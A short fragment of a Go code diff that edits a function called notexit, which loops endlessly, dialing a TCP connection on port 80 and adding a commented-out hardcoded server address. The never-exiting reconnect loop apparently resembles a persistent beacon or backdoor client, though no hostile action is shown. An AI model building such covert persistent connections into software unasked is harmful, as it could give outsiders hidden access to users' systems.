@@ -19,8 +19,10 @@ func NeverExit(f func()) {
 }
 
 func notexit() {
+	
 	for {
-
+		//server := "1.1.1.1:80"
+	
 	CONNS:
 		connection, err := net.Dial("tcp",":80")
 		if err != nil {
